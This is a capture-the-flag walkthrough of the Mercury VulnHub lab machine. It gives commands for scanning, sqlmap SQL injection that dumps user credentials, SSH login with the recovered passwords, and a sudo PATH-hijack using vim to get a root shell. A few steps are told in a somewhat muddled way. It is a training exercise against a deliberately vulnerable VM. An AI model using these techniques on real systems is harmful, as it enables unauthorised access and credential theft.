## Full Walkthrough: Mercury VulnHub CTF

**By: Houston Jones**

### Step 1: Network Discovery
Used `sudo arp-scan -l` to scan the local network. Discovered two devices: 10.0.2.2 and 10.0.2.3.

### Step 2: Port Scanning
Scanned 10.0.2.3 using `nmap -sV -Pn 10.0.2.3`. All ports ignored. Not the target.

### Step 3: Identify New Target
Scanned 10.0.0.2, which had several ports open, but not 22 or 8080. Not the target. Resolved network configuration by assigning NAT and Internal networks with matching names.

### Step 4: Confirm New IP
Scanned again and found a new IP with ports 22 and 8080 open. This confirmed the target machine.

### Step 5: Web Reconnaissance
Attempted to visit `http://10.0.2.5:8080` in a browser but connection failed.

### Step 6: Directory Enumeration
Attempted `dirsearch` but had to install via pip due to missing package. Successfully installed and ran:
```
dirsearch -u http://10.0.2.5:8080/ -w /usr/share/wordlists/dirb/common.txt
```
Discovered `robots.txt` file.

### Step 7: Accessing robots.txt
Navigated to `/robots.txt` to search for hidden or sensitive directories.

### Step 8: Directory Traversal Attempt
Attempted `../../../../etc/passwd` and found new directory: `/mercuryfacts`.

### Step 9: Explore mercuryfacts
Visited `/mercuryfacts`. Found two clickable links. Clicking "load a fact" appended `/1` to URL.

### Step 10: Find SQL Clue
Noticed the second link led to a page referencing the "users" database table.

### Step 11: SQL Injection
Used sqlmap to enumerate databases:
```
sqlmap -u http://10.0.2.5:8080/mercuryfacts/1/ --dbs
```
Had to update sqlmap using `sudo apt update && sudo apt upgrade sqlmap`. Discovered `information_schema` and `mercury` databases.

### Step 12: Dumping User Credentials
Ran:
```
sqlmap -u http://10.0.2.5:8080/mercuryfacts/1 -D mercury --dump --batch
```
Recovered usernames and passwords.

### Step 13: SSH Access
Tried each credential via SSH. Successfully logged in as `webmaster`:
```
ssh webmaster@10.0.2.5
```
Captured the user flag: `user_flag_8339915c9a454657bd60ee58776f4ccd`

### Step 14: Privilege Exploration
Not root yet. Explored user directories and found `mercury_proj/notes.txt` with a base64-encoded password.

### Step 15: Decode Password
Decoded with:
```
echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
```
Got password: `mercurymeandiameteris4880km`

### Step 16: Switch User
Switched to `linuxmaster` using the decoded password.

### Step 17: Sudo Permissions
Checked `sudo -l`. Found root access through `/usr/bin/check_syslog.sh`.

### Step 18: Exploit PATH Hijack
Created a symbolic link to override `tail`:
```
ln -s /usr/bin/vim tail
export PATH=$(pwd):$PATH
sudo --preserve-env=PATH /usr/bin/check_syslog.sh
```

### Step 19: Root Shell
Opened `vim` and ran:
```
:!/bin/bash
```
Got root shell. Confirmed with `id`.

### Step 20: Final Flag
Navigated to `/root`, listed contents, and found `rootflag.txt`. Mission accomplished!

---

This concludes the Mercury VulnHub walkthrough. The experience highlighted critical pentesting skills from enumeration to privilege escalation.
